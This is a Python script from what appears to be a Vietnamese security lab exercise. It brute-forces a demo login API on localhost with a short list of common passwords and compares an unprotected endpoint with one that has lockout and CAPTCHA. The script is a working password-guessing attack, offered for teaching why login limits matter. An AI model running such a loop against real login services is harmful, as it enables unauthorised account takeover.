#!/usr/bin/env python3
"""
Lab 5 - Script minh hoạ tấn công Brute Force (CHỈ dùng cho app demo của chính mình).

CẢNH BÁO ĐẠO ĐỨC / PHÁP LÝ:
  - Script này chỉ trỏ tới http://localhost:5000 (app demo tự dựng trong lab này).
  - Mục đích DUY NHẤT: chứng minh vì sao cần giới hạn đăng nhập + CAPTCHA.
  - KHÔNG được dùng để dò mật khẩu trên bất kỳ hệ thống nào không phải của bạn.
    Làm vậy là vi phạm pháp luật.

Cách chạy:
  python brute_force.py unprotected   # tấn công endpoint KHÔNG bảo vệ -> tìm ra mật khẩu
  python brute_force.py protected     # tấn công endpoint CÓ bảo vệ   -> bị chặn
"""
import sys
import requests

TARGET = "http://localhost:5000"     # cố định localhost - app demo của chính mình
USERNAME = "user1"

# Wordlist demo nhỏ: vài mật khẩu phổ biến + mật khẩu đúng ở gần cuối.
WORDLIST = [
    "123456", "password", "admin", "qwerty", "111111",
    "user1", "letmein", "abc123", "iloveyou", "Pass123",  # <- mật khẩu đúng
    "root", "12345678",
]


def try_login(endpoint, password):
    """Gửi 1 lần thử đăng nhập, trả về (http_status, json)."""
    r = requests.post(
        f"{TARGET}/api/login-{endpoint}",
        json={"username": USERNAME, "password": password},
        timeout=5,
    )
    try:
        return r.status_code, r.json()
    except ValueError:
        return r.status_code, {}


def run(endpoint):
    print(f"[*] Bắt đầu brute force -> /api/login-{endpoint}  (user: {USERNAME})")
    print(f"[*] Wordlist: {len(WORDLIST)} mật khẩu\n")
    for i, pw in enumerate(WORDLIST, 1):
        status, data = try_login(endpoint, pw)
        tag = f"[{i:>2}/{len(WORDLIST)}] thử '{pw}'"

        if data.get("success"):
            print(f"{tag:<34} -> ✔ THÀNH CÔNG! Mật khẩu = '{pw}'")
            print(f"\n[+] Tìm ra mật khẩu sau {i} lần thử.")
            return
        if data.get("locked"):
            print(f"{tag:<34} -> ⛔ BỊ KHÓA: {data.get('message')}")
            print(f"\n[-] Dừng ở lần thử {i}: server đã khóa, không dò tiếp được.")
            return
        if data.get("needCaptcha"):
            print(f"{tag:<34} -> 🧩 YÊU CẦU CAPTCHA: {data.get('message')}")
            print(f"\n[-] Dừng ở lần thử {i}: server bắt CAPTCHA, script tự động không vượt qua được.")
            return
        print(f"{tag:<34} -> ✘ sai (HTTP {status})")

    print("\n[-] Hết wordlist, không tìm ra mật khẩu.")


if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "unprotected"
    if endpoint not in ("unprotected", "protected"):
        print("Dùng: python brute_force.py [unprotected|protected]")
        sys.exit(1)
    run(endpoint)
